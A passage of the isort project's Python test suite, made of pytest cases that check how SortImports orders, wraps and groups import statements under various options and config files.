cookiecutter.repo_name }}\\n\"\n                  \"from foo import {{ cookiecutter.bar }}\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_fcntl():\n    \"\"\"Test to ensure fcntl gets correctly recognized as stdlib import\"\"\"\n    test_input = (\"import fcntl\\n\"\n                  \"import os\\n\"\n                  \"import sys\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_import_split_is_word_boundary_aware():\n    \"\"\"Test to ensure that isort splits words in a boundary aware manner\"\"\"\n    test_input = (\"from mycompany.model.size_value_array_import_func import \\\\\\n\"\n                \"    get_size_value_array_import_func_jobs\")\n    test_output = SortImports(file_contents=test_input,\n      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n      line_length=79).output\n    assert test_output == (\"from mycompany.model.size_value_array_import_func import (\\n\"\n                           \"    get_size_value_array_import_func_jobs\\n\"\n                           \")\\n\")\n\n\ndef test_other_file_encodings(tmpdir):\n    \"\"\"Test to ensure file encoding is respected\"\"\"\n    for encoding in ('latin1', 'utf8'):\n        tmp_fname = tmpdir.join('test_{0}.py'.format(encoding))\n        file_contents = \"# coding: {0}\\n\\ns = u'\u00e3'\\n\".format(encoding)\n        tmp_fname.write_binary(file_contents.encode(encoding))\n        assert SortImports(file_path=str(tmp_fname), settings_path=os.getcwd()).output == file_contents\n\n\ndef test_comment_at_top_of_file():\n    \"\"\"Test to ensure isort correctly handles top of file comments\"\"\"\n    test_input = (\"# Comment one\\n\"\n                  \"from django import forms\\n\"\n                  \"# Comment two\\n\"\n                  \"from django.contrib.gis.geos import GEOSException\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = (\"# -*- coding: utf-8 -*-\\n\"\n                  \"from django.db import models\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_alphabetic_sorting():\n    \"\"\"Test to ensure isort correctly handles single line imports\"\"\"\n    test_input = (\"import unittest\\n\"\n                  \"\\n\"\n                  \"import ABC\\n\"\n                  \"import Zope\\n\"\n                  \"from django.contrib.gis.geos import GEOSException\\n\"\n                  \"from plone.app.testing import getRoles\\n\"\n                  \"from plone.app.testing import ManageRoles\\n\"\n                  \"from plone.app.testing import setRoles\\n\"\n                  \"from Products.CMFPlone import utils\\n\"\n                  )\n    options = {'force_single_line': True,\n               'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]\n\n    output = SortImports(file_contents=test_input, known_first_party=['django'], **options).output\n    assert output == test_input\n\n    test_input = (\"# -*- coding: utf-8 -*-\\n\"\n                  \"from django.db import models\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_alphabetic_sorting_multi_line():\n    \"\"\"Test to ensure isort correctly handles multiline import see: issue 364\"\"\"\n    test_input = (\"from a import (CONSTANT_A, cONSTANT_B, CONSTANT_C, CONSTANT_D, CONSTANT_E,\\n\"\n                  \"               CONSTANT_F, CONSTANT_G, CONSTANT_H, CONSTANT_I, CONSTANT_J)\\n\")\n    options = {'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]\n    assert SortImports(file_contents=test_input, **options).output == test_input\n\n\ndef test_comments_not_duplicated():\n    \"\"\"Test to ensure comments aren't duplicated: issue 303\"\"\"\n    test_input = ('from flask import url_for\\n'\n                  \"# Whole line comment\\n\"\n                  'from service import demo  # inline comment\\n'\n                  'from service import settings\\n')\n    output = SortImports(file_contents=test_input).output\n    assert output.count(\"# Whole line comment\\n\") == 1\n    assert output.count(\"# inline comment\\n\") == 1\n\n\ndef test_top_of_line_comments():\n    \"\"\"Test to ensure top of line comments stay where they should: issue 260\"\"\"\n    test_input = ('# -*- coding: utf-8 -*-\\n'\n                  'from django.db import models\\n'\n                  '#import json as simplejson\\n'\n                  'from myproject.models import Servidor\\n'\n                  '\\n'\n                  'import reversion\\n'\n                   '\\n'\n                   'import logging\\n')\n    output = SortImports(file_contents=test_input).output\n    print(output)\n    assert output.startswith('# -*- coding: utf-8 -*-\\n')\n\n\ndef test_basic_comment():\n    \"\"\"Test to ensure a basic comment wont crash isort\"\"\"\n    test_input = ('import logging\\n'\n                  '# Foo\\n'\n                  'import os\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_shouldnt_add_lines():\n    \"\"\"Ensure that isort doesn't add a blank line when a top of import comment is present, issue #316\"\"\"\n    test_input = ('\"\"\"Text\"\"\"\\n'\n                  '# This is a comment\\n'\n                 'import pkg_resources\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_sections_parsed_correct(tmpdir):\n    \"\"\"Ensure that modules for custom sections parsed as list from config file and isort result is correct\"\"\"\n    conf_file_data = (\n        '[settings]\\n'\n        'sections=FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON\\n'\n        'known_common=nose\\n'\n        'import_heading_common=Common Library\\n'\n        'import_heading_stdlib=Standard Library\\n'\n    )\n    test_input = (\n        'import os\\n'\n        'from nose import *\\n'\n        'import nose\\n'\n        'from os import path'\n    )\n    correct_output = (\n        '# Standard Library\\n'\n        'import os\\n'\n        'from os import path\\n'\n        '\\n'\n        '# Common Library\\n'\n        'import nose\\n'\n        'from nose import *\\n'\n    )\n    tmpdir.join('.isort.cfg').write(conf_file_data)\n    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output\n\n\n@pytest.mark.skipif(toml is None, reason=\"Requires toml package to be installed.\")\ndef test_pyproject_conf_file(tmpdir):\n    \"\"\"Ensure that modules for custom sections parsed as list from config file and isort result is correct\"\"\"\n    conf_file_data = (\n        '[build-system]\\n'\n        'requires = [\"setuptools\", \"wheel\"]\\n'\n        '[tool.poetry]\\n'\n        'name = \"isort\"\\n'\n        'version = \"0.1.0\"\\n'\n        'license = \"MIT\"\\n'\n        '[tool.isort]\\n'\n        'lines_between_types=1\\n'\n        'known_common=\"nose\"\\n'\n        'import_heading_common=\"Common Library\"\\n'\n        'import_heading_stdlib=\"Standard Library\"\\n'\n        'sections=\"FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON\"\\n'\n        'include_trailing_comma = true\\n'\n    )\n    test_input = (\n        'import os\\n'\n        'from nose import *\\n'\n        'import nose\\n'\n        'from os import path'\n    )\n    correct_output = (\n        '# Standard Library\\n'\n        'import os\\n'\n        '\\n'\n        'from os import path\\n'\n        '\\n'\n        '# Common Library\\n'\n        'import nose\\n'\n        '\\n'\n        'from nose import *\\n'\n    )\n    tmpdir.join('pyproject.toml').write(conf_file_data)\n    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output\n\n\ndef test_alphabetic_sorting_no_newlines():\n    '''Test to ensure that alphabetical sort does not erroneously introduce new lines (issue #328)'''\n    test_input = \"import os\\n\"\n    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True).output\n    assert test_input == test_output\n\n    test_input = ('import os\\n'\n                  'import unittest\\n'\n                  '\\n'\n                  'from a import b\\n'\n                  '\\n'\n                  '\\n'\n                  'print(1)\\n')\n    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True, lines_after_imports=2).output\n    assert test_input == test_output\n\n\ndef test_sort_within_section():\n    '''Test to ensure its possible to force isort to sort within sections'''\n    test_input = ('from Foob import ar\\n'\n                  'import foo\\n'\n                  'from foo import bar\\n'\n                  'from foo.bar import Quux, baz\\n')\n    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True).output\n    assert test_output == test_input\n\n    test_input = ('import foo\\n'\n                  'from foo import bar\\n'\n                  'from foo.bar import baz\\n'\n                  'from foo.bar import Quux\\n'\n                  'from Foob import ar\\n')\n    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True, order_by_type=False,\n                              force_single_line=True).output\n    assert test_output == test_input\n\n\ndef test_sorting_with_two_top_comments():\n    '''Test to ensure isort will sort files that contain 2 top comments'''\n    test_input = ('#! comment1\\n'\n                  \"''' comment2\\n\"\n                  \"'''\\n\"\n                  'import b\\n'\n                  'import a\\n')\n    assert SortImports(file_contents=test_input).output == ('#! comment1\\n'\n                                                            \"''' comment2\\n\"\n                                                            \"'''\\n\"\n                                                            'import a\\n'\n                                                            'import b\\n')\n\n\ndef test_lines_between_sections():\n    \"\"\"Test to ensure lines_between_sections works\"\"\"\n    test_input = ('from bar import baz\\n'\n                  'import os\\n')\n    assert SortImports(file_contents=test_input, lines_between_sections=0).output == ('import os\\n'\n                                                                                      'from bar import baz\\n')\n    assert SortImports(file_contents=test_input, lines_between_sections=2).output == ('import os\\n\\n\\n'\n                                                                                      'from bar import baz\\n')\n\n\ndef test_forced_sepatate_globs():\n    \"\"\"Test to ensure that forced_separate glob matches lines\"\"\"\n    test_input = ('import os\\n'\n                  '\\n'\n                  'from myproject.foo.models import Foo\\n'\n                  '\\n'\n                  'from myproject.utils import util_method\\n'\n                  '\\n'\n                  'from myproject.bar.models import Bar\\n'\n                  '\\n'\n                  'import sys\\n')\n    test_output = SortImports(file_contents=test_input, forced_separate=['*.models'],\n                              line_length=120).output\n\n    assert test_output == ('import os\\n'\n                          'import sys\\n'\n                          '\\n'\n                          'from myproject.utils import util_method\\n'\n                          '\\n'\n                          'from myproject.bar.models import Bar\\n'\n                          'from myproject.foo.models import Foo\\n')\n\n\ndef test_no_additional_lines_issue_358():\n    \"\"\"Test to ensure issue 358 is resolved and running isort multiple times does not add extra newlines\"\"\"\n    test_input = ('\"\"\"This is a docstring\"\"\"\\n'\n                  '# This is a comment\\n'\n                  'from __future__ import (\\n'\n                  '    absolute_import,\\n'\n                  '    division,\\n'\n                  '    print_function,\\n'\n                  '    unicode_literals\\n'\n                  ')\\n')\n    expected_output = ('\"\"\"This is a docstring\"\"\"\\n'\n                       '# This is a comment\\n'\n                       'from __future__ import (\\n'\n                       '    absolute_import,\\n'\n                       '    division,\\n'\n                       '    print_function,\\n'\n                       '    unicode_literals\\n'\n                       ')\\n')\n    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                              line_length=20).output\n    assert test_output == expected_output\n\n    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                              line_length=20).output\n    assert test_output == expected_output\n\n    for attempt in range(5):\n        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                                  line_length=20).output\n        assert test_output == expected_output\n\n    test_input = ('\"\"\"This is a docstring\"\"\"\\n'\n                  '\\n'\n                  '# This is a comment\\n'\n                  'from __future__ import (\\n'\n                  '    absolute_import,\\n'\n                  '    division,\\n'\n                  '    print_function,\\n'\n                  '    unicode_literals\\n'\n                  ')\\n')\n    expected_output = ('\"\"\"This is a docstring\"\"\"\\n'\n                       '\\n'\n                       '# This is a comment\\n'\n                       'from __future__ import (\\n'\n                       '    absolute_import,\\n'\n                       '    division,\\n'\n                       '    print_function,\\n'\n                       '    unicode_literals\\n'\n                       ')\\n')\n    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                              line_length=20).output\n    assert test_output == expected_output\n\n    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                              line_length=20).output\n    assert test_output == expected_output\n\n    for attempt in range(5):\n        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                                  line_length=20).output\n        assert test_output == expected_output\n\n\ndef test_import_by_paren_issue_375():\n    \"\"\"Test to ensure isort can correctly handle sorting imports where the paren is directly by the import body\"\"\"\n    test_input = ('from .models import(\\n'\n                  '   Foo,\\n'\n                  '   Bar,\\n'\n                  ')\\n')\n    assert SortImports(file_contents=test_input).output == 'from .models import Bar, Foo\\n'\n\n\ndef test_import_by_paren_issue_460():\n    \"\"\"Test to ensure isort can doesnt move comments around \"\"\"\n    test_input = \"\"\"\n# First comment\n# Second comment\n# third comment\nimport io\nimport os\n\"\"\"\n    assert SortImports(file_contents=(test_input)).output == test_input\n\n\ndef test_function_with_docstring():\n    \"\"\"Test to ensure isort can correctly sort imports when the first found content is a function with a docstring\"\"\"\n    add_imports = ['from __future__ import unicode_literals']\n    test_input = ('def foo():\\n'\n                  '    \"\"\" Single line triple quoted doctring \"\"\"\\n'\n                  '    pass\\n')\n    expected_output = ('from __future__ import unicode_literals\\n'\n                       '\\n'\n                       '\\n'\n                       'def foo():\\n'\n                       '    \"\"\" Single line triple quoted doctring \"\"\"\\n'\n                       '    pass\\n')\n    assert SortImports(file_contents=test_input, add_imports=add_imports).output == expected_output\n\n\ndef test_plone_style():\n    \"\"\"Test to ensure isort correctly plone style imports\"\"\"\n    test_input = (\"from django.contrib.gis.geos import GEOSException\\n\"\n                  \"from plone.app.testing import getRoles\\n\"\n                  \"from plone.app.testing import ManageRoles\\n\"\n                  \"from plone.app.testing import setRoles\\n\"\n                  \"from Products.CMFPlone import utils\\n\"\n                  \"\\n\"\n                  \"import ABC\\n\"\n                  \"import unittest\\n\"\n                  \"import Zope\\n\")\n    options = {'force_single_line': True,\n               'force_alphabetical_sort': True}  # type: Dict[str, Any]\n    assert SortImports(file_contents=test_input, **options).output == test_input\n\n\ndef test_third_party_case_sensitive():\n    \"\"\"Modules which match builtins by name but not on case should not be picked up on Windows.\"\"\"\n    test_input = (\"import thirdparty\\n\"\n                  \"import os\\n\"\n                  \"import ABC\\n\")\n\n    expected_output = ('import os\\n'\n                       '\\n'\n                       'import ABC\\n'\n                       'import thirdparty\\n')\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_exists_case_sensitive_file(tmpdir):\n    \"\"\"Test exists_case_sensitive function for a file.\"\"\"\n    tmpdir.join('module.py').ensure(file=1)\n    assert exists_case_sensitive(str(tmpdir.join('module.py')))\n    assert not exists_case_sensitive(str(tmpdir.join('MODULE.py')))\n\n\ndef test_exists_case_sensitive_directory(tmpdir):\n    \"\"\"Test exists_case_sensitive function for a directory.\"\"\"\n    tmpdir.join('pkg').ensure(dir=1)\n    assert exists_case_sensitive(str(tmpdir.join('pkg')))\n    assert not exists_case_sensitive(str(tmpdir.join('PKG')))\n\n\ndef test_sys_path_mutation(tmpdir):\n    \"\"\"Test to ensure sys.path is not modified\"\"\"\n    tmpdir.mkdir('src').mkdir('a')\n    test_input = \"from myproject import test\"\n    options = {'virtual_env': str(tmpdir)}  # type: Dict[str, Any]\n    expected_length = len(sys.path)\n    SortImports(file_contents=test_input, **options).output\n    assert len(sys.path) == expected_length\n\n\ndef test_long_single_line():\n    \"\"\"Test to ensure long single lines get handled correctly\"\"\"\n    output = SortImports(file_contents=\"from ..views import (\"\n                                       \" _a,\"\n                                       \"_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)\",\n                         line_length=79).output\n    for line in output.split('\\n'):\n        assert len(line) <= 79\n\n    output = SortImports(file_contents=\"from ..views import (\"\n                                       \" _a,\"\n                                       \"_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)\",\n                         line_length=76, combine_as_imports=True).output\n    for line in output.split('\\n'):\n        assert len(line) <= 79\n\n\ndef test_import_inside_class_issue_432():\n    \"\"\"Test to ensure issue 432 is resolved and isort doesn't insert imports in the middle of classes\"\"\"\n    test_input = (\"# coding=utf-8\\n\"\n                  \"class Foo:\\n\"\n                  \"    def bar(self):\\n\"\n                  \"        pass\\n\")\n    expected_output = (\"# coding=utf-8\\n\"\n                       \"import baz\\n\"\n                       \"\\n\"\n                       \"\\n\"\n                       \"class Foo:\\n\"\n                       \"    def bar(self):\\n\"\n                       \"        pass\\n\")\n    assert SortImports(file_contents=test_input, add_imports=['import baz']).output == expected_output\n\n\ndef test_wildcard_import_without_space_issue_496():\n    \"\"\"Test to ensure issue #496: wildcard without space, is resolved\"\"\"\n    test_input = 'from findorserver.coupon.models import*'\n    expected_output = 'from findorserver.coupon.models import *\\n'\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_import_line_mangles_issues_491():\n    \"\"\"Test to ensure comment on import with parens doesn't cause issues\"\"\"\n    test_input = ('import os  # ([\\n'\n                  '\\n'\n                  'print(\"hi\")\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_import_line_mangles_issues_505():\n    \"\"\"Test to ensure comment on import with parens doesn't cause issues\"\"\"\n    test_input = ('from sys import *  # (\\n'\n                  '\\n'\n                  '\\n'\n                  'def test():\\n'\n                  '    print(\"Test print\")\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_import_line_mangles_issues_439():\n    \"\"\"Test to ensure comment on import with parens doesn't cause issues\"\"\"\n    test_input = ('import a  # () import\\n'\n                  'from b import b\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_alias_using_paren_issue_466():\n    \"\"\"Test to ensure issue #466: Alias causes slash incorrectly is resolved\"\"\"\n    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\\n'\n    expected_output = ('from django.db.backends.mysql.base import (\\n'\n                       '    DatabaseWrapper as MySQLDatabaseWrapper)\\n')\n    assert SortImports(file_contents=test_input, line_length=50, use_parentheses=True).output == expected_output\n\n    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\\n'\n    expected_output = ('from django.db.backends.mysql.base import (\\n'\n                       '    DatabaseWrapper as MySQLDatabaseWrapper\\n'\n                       ')\\n')\n    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,\n                       use_parentheses=True).output == expected_output\n\n\ndef test_long_alias_using_paren_issue_957():\n    test_input = ('from package import module as very_very_very_very_very_very_very_very_very_very_long_alias\\n')\n    expected_output = ('from package import (\\n'\n                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\\n'\n                       ')\\n')\n    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output\n    assert out == expected_output\n\n    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import module as very_very_very_very_very_very_very_very_very_very_long_alias\\n')\n    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\\n'\n                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\\n'\n                       ')\\n')\n    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output\n    assert out == expected_output\n\n    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\\n')\n    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\\n'\n                       '    very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\\n'\n                       ')\\n')\n    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output\n    assert out == expected_output\n\n\ndef test_strict_whitespace_by_default(capsys):\n    test_input = ('import os\\n'\n                  'from django.conf import settings\\n')\n    SortImports(file_contents=test_input, check=True)\n    out, err = capsys.readouterr()\n    assert out == 'ERROR:  Imports are incorrectly sorted.\\n'\n\n\ndef test_strict_whitespace_no_closing_newline_issue_676(capsys):\n    test_input = ('import os\\n'\n                  '\\n'\n                  'from django.conf import settings\\n'\n                  '\\n'\n                  'print(1)')\n    SortImports(file_contents=test_input, check=True)\n    out, err = capsys.readouterr()\n    assert out == ''\n\n\ndef test_ignore_whitespace(capsys):\n    test_input = ('import os\\n'\n                  'from django.conf import settings\\n')\n    SortImports(file_contents=test_input, check=True, ignore_whitespace=True)\n    out, err = capsys.readouterr()\n    assert out == ''\n\n\ndef test_import_wraps_with_comment_issue_471():\n    \"\"\"Test to ensure issue #471 is resolved\"\"\"\n    test_input = ('from very_long_module_name import SuperLongClassName  #@UnusedImport'\n                  ' -- long string of comments which wrap over')\n    expected_output = ('from very_long_module_name import (\\n'\n                       '    SuperLongClassName)  # @UnusedImport -- long string of comments which wrap over\\n')\n    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=1,\n                       use_parentheses=True).output == expected_output\n\n\ndef test_import_case_produces_inconsistent_results_issue_472():\n    \"\"\"Test to ensure sorting imports with same name but different case produces the same result across platforms\"\"\"\n    test_input = ('from sqlalchemy.dialects.postgresql import ARRAY\\n'\n                  'from sqlalchemy.dialects.postgresql import array\\n')\n    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input\n\n    test_input = 'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\\n'\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_inconsistent_behavior_in_python_2_and_3_issue_479():\n    \"\"\"Test to ensure Python 2 and 3 have the same behavior\"\"\"\n    test_input = ('from future.standard_library import hooks\\n'\n                  'from workalendar.europe import UnitedKingdom\\n')\n    assert SortImports(file_contents=test_input,\n                       known_first_party=[\"future\"]).output == test_input\n\n\ndef test_sort_within_section_comments_issue_436():\n    \"\"\"Test to ensure sort within sections leaves comments untouched\"\"\"\n    test_input = ('import os.path\\n'\n                  'import re\\n'\n                  '\\n'\n                  '# report.py exists in ... comment line 1\\n'\n                  '# this file needs to ...  comment line 2\\n'\n                  '# it must not be ...      comment line 3\\n'\n                  'import report\\n')\n    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input\n\n\ndef test_sort_within_sections_with_force_to_top_issue_473():\n    \"\"\"Test to ensure it's possible to sort within sections with items forced to top\"\"\"\n    test_input = ('import z\\n'\n                  'import foo\\n'\n                  'from foo import bar\\n')\n    assert SortImports(file_contents=test_input, force_sort_within_sections=True,\n                       force_to_top=['z']).output == test_input\n\n\ndef test_correct_number_of_new_lines_with_comment_issue_435():\n    \"\"\"Test to ensure that injecting a comment in-between imports doesn't mess up the new line spacing\"\"\"\n    test_input = ('import foo\\n'\n                  '\\n'\n                  '# comment\\n'\n                  '\\n'\n                  '\\n'\n                  'def baz():\\n'\n                  '    pass\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_future_below_encoding_issue_545():\n    \"\"\"Test to ensure future is always below comment\"\"\"\n    test_input = ('#!/usr/bin/env python\\n'\n                  'from __future__ import print_function\\n'\n                  'import logging\\n'\n                  '\\n'\n                  'print(\"hello\")\\n')\n    expected_output = ('#!/usr/bin/env python\\n'\n                       'from __future__ import print_function\\n'\n                       '\\n'\n                       'import logging\\n'\n                       '\\n'\n                       'print(\"hello\")\\n')\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_no_extra_lines_issue_557():\n    \"\"\"Test to ensure no extra lines are prepended\"\"\"\n    test_input = ('import os\\n'\n                  '\\n'\n                  'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\\n')\n    expected_output = ('import os\\n'\n                       'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\\n')\n    assert SortImports(file_contents=test_input, force_alphabetical_sort=True,\n                       force_sort_within_sections=True).output == expected_output\n\n\ndef test_long_import_wrap_support_with_mode_2():\n    \"\"\"Test to ensure mode 2 still allows wrapped imports with slash\"\"\"\n    test_input = ('from foobar.foobar.foobar.foobar import \\\\\\n'\n                  '    an_even_longer_function_name_over_80_characters\\n')\n    assert SortImports(file_contents=test_input, multi_line_output=WrapModes.HANGING_INDENT,\n                       line_length=80).output == test_input\n\n\ndef test_pylint_comments_incorrectly_wrapped_issue_571():\n    \"\"\"Test to ensure pylint comments don't get wrapped\"\"\"\n    test_input = ('from PyQt5.QtCore import QRegExp  # @UnresolvedImport pylint: disable=import-error,'\n                  'useless-suppression\\n')\n    expected_output = ('from PyQt5.QtCore import \\\\\\n'\n                       '    QRegExp  # @UnresolvedImport pylint: disable=import-error,useless-suppression\\n')\n    assert SortImports(file_contents=test_input, line_length=60).output == expected_output\n\n\ndef test_ensure_async_methods_work_issue_537():\n    \"\"\"Test to ensure async methods are correctly identified\"\"\"\n    test_input = ('from myapp import myfunction\\n'\n                  '\\n'\n                  '\\n'\n                  'async def test_myfunction(test_client, app):\\n'\n                  '    a = await myfunction(test_client, app)\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_ensure_as_imports_sort_correctly_within_from_imports_issue_590():\n    \"\"\"Test to ensure combination from and as import statements are sorted correct\"\"\"\n    test_input = ('from os import defpath\\n'\n                  'from os import pathsep as separator\\n')\n    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input\n\n    test_input = ('from os import defpath\\n'\n                  'from os import pathsep as separator\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = ('from os import defpath\\n'\n                  'from os import pathsep as separator\\n')\n    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input\n\n\ndef test_ensure_line_endings_are_preserved_issue_493():\n    \"\"\"Test to ensure line endings are not converted\"\"\"\n    test_input = ('from os import defpath\\r\\n'\n                  'from os import pathsep as separator\\r\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n    test_input = ('from os import defpath\\r'\n                  'from os import pathsep as separator\\r')\n    assert SortImports(file_contents=test_input).output == test_input\n    test_input = ('from os import defpath\\n'\n                  'from os import pathsep as separator\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_not_splitted_sections():\n    whiteline = '\\n'\n    stdlib_section = 'import unittest\\n'\n    firstparty_section = 'from app.pkg1 import mdl1\\n'\n    local_section = 'from .pkg2 import mdl2\\n'\n    statement = 'foo = bar\\n'\n    test_input = (\n        stdlib_section + whiteline + firstparty_section + whiteline +\n        local_section + whiteline + statement\n    )\n\n    assert SortImports(file_contents=test_input).output == test_input\n    assert SortImports(file_contents=test_input, no_lines_before=['LOCALFOLDER']).output == \\\n           (\n               stdlib_section + whiteline + firstparty_section + local_section +\n               whiteline + statement\n           )\n    # by default STDLIB and FIRSTPARTY sections are split by THIRDPARTY section,\n    # so don't merge them if THIRDPARTY imports aren't exist\n    assert SortImports(file_contents=test_input, no_lines_before=['FIRSTPARTY']).output == test_input\n    # in case when THIRDPARTY section is excluded from sections list, it's ok to merge STDLIB and FIRSTPARTY\n    assert SortImports(\n        file_contents=test_input,\n        sections=['STDLIB', 'FIRSTPARTY', 'LOCALFOLDER'],\n        no_lines_before=['FIRSTPARTY'],\n    ).output == (\n        stdlib_section + firstparty_section + whiteline + local_section +\n        whiteline + statement\n    )\n    # it doesn't change output, because stdlib packages don't have any whitelines before them\n    assert SortImports(file_contents=test_input, no_lines_before=['STDLIB']).output == test_input\n\n\ndef test_no_lines_before_empty_section():\n    test_input = ('import first\\n'\n                  'import custom\\n')\n    assert SortImports(\n        file_contents=test_input,\n        known_third_party=[\"first\"],\n        known_custom=[\"custom\"],\n        sections=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],\n        no_lines_before=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],\n    ).output == test_input\n\n\ndef test_no_inline_sort():\n    \"\"\"Test to ensure multiple `from` imports in one line are not sorted if `--no-inline-sort` flag\n    is enabled. If `--force-single-line-imports` flag is enabled, then `--no-inline-sort` is ignored.\"\"\"\n    test_input = 'from foo import a, c, b\\n'\n    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=False).output == test_input\n    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=False).output == 'from foo import a, b, c\\n'\n    expected = (\n        'from foo import a\\n'\n        'from foo import b\\n'\n        'from foo import c\\n'\n    )\n    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=True).output == expected\n    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=True).output == expected\n\n\ndef test_relative_import_of_a_module():\n    \"\"\"Imports can be dynamically created (PEP302) and is used by modules such as six.  This test ensures that\n    these types of imports are still sorted to the correct type instead of being categorized as local.\"\"\"\n    test_input = ('from __future__ import absolute_import\\n'\n                  '\\n'\n                  'import itertools\\n'\n                  '\\n'\n                  'from six import add_metaclass\\n'\n                  '\\n'\n                  'from six.moves import asd\\n'\n                  )\n\n    expected_results = ('from __future__ import absolute_import\\n'\n                        '\\n'\n                        'import itertools\\n'\n                        '\\n'\n                        'from six import add_metaclass\\n'\n                        'from six.moves import asd\\n'\n                        )\n\n    sorted_result = SortImports(file_contents=test_input, force_single_line=True).output\n    assert sorted_result == expected_results\n\n\ndef test_escaped_parens_sort():\n    test_input = ('from foo import \\\\ \\n'\n                  '(a,\\n'\n                  'b,\\n'\n                  'c)\\n')\n    expected = ('from foo import a, b, c\\n')\n    assert SortImports(file_contents=test_input).output == expected\n\n\ndef test_is_python_file_ioerror(tmpdir):\n    does_not_exist = tmpdir.join('fake.txt')\n    assert is_python_file(str(does_not_exist)) is False\n\n\ndef test_is_python_file_shebang(tmpdir):\n    path = tmpdir.join('myscript')\n    path.write('#!/usr/bin/env python\\n')\n    assert is_python_file(str(path)) is True\n\n\ndef test_is_python_file_editor_backup(tmpdir):\n    path = tmpdir.join('myscript~')\n    path.write('#!/usr/bin/env python\\n')\n    assert is_python_file(str(path)) is False\n\n\ndef test_is_python_typing_stub(tmpdir):\n    stub = tmpdir.join('stub.pyi')\n    assert is_python_file(str(stub)) is True\n\n\ndef test_to_ensure_imports_are_brought_to_top_issue_651():\n    test_input = ('from __future__ import absolute_import, unicode_literals\\n'\n                  '\\n'\n                  'VAR = \"\"\"\\n'\n                  'multiline text\\n'\n                  '\"\"\"\\n'\n                  '\\n'\n                  'from __future__ import unicode_literals\\n'\n                  'from __future__ import absolute_import\\n')\n    expected_output = ('from __future__ import absolute_import, unicode_literals\\n'\n                       